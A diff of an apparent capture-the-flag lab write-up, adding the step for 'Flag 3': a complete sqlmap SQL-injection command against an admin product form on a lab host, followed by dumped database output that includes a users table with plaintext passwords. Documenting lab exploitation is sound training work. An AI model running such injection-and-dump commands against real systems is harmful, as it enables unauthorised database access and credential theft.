@@ -105,3 +105,35 @@ PORT     STATE SERVICE       REASON          VERSION
 view-source:https://10.13.37.12/Home/Staff
 
 # Flag 3 Have we met before?
+```bash
+sqlmap -u 'https://10.13.37.12:443/Admin/AddProduct' --data='name=1&price=1&creationYear=1&certified=1&__RequestVerificationToken=CfDJ8K9TQWNukZhLhmhij967A4N1qNy8yK6D_PYoKKWFzGhwu2T0AKBh7eORVPVQsIounQOjuK_T7V9FOQhn6N3I78_dsxykDdrBAbwYYoZ2VL5r3tVgXbqhYltG8CfWsYQd9E4Vpkunp1td9QFz4YeOWbg' --level=5 --risk=3 --dbms='Microsoft SQL Server ' --cookie='[...SNIP...]' --dump-all
+
+...[SNIP]...
+available databases [4]:
+[*] model
+[*] msdb
+[*] tempdb
+[*] webapp
+
+Database: webapp
+[2 tables]
++----------+
+| products |
+| users    |
++----------+
+
+Database: webapp
+Table: users
+[3 entries]
++----+----------------------------------------+----------------+-----------+------------+
+| id | password                               | username       | last_name | first_name |
++----+----------------------------------------+----------------+-----------+------------+
+| 1  | admin                                  | jay.teignton   | Teignton  | Jay        |
+| 2  | AMkru$3_f'/Q^7f?                       | abbie.buckfast | Buckfast  | Abbie      |
+| 3  | CONTEXT{d[REDACTED]t}                  | test           | tester    | testing    |
++----+----------------------------------------+----------------+-----------+------------+
+```
+
+# Flag 4 Is it a bird? Is it a plane?
+
+
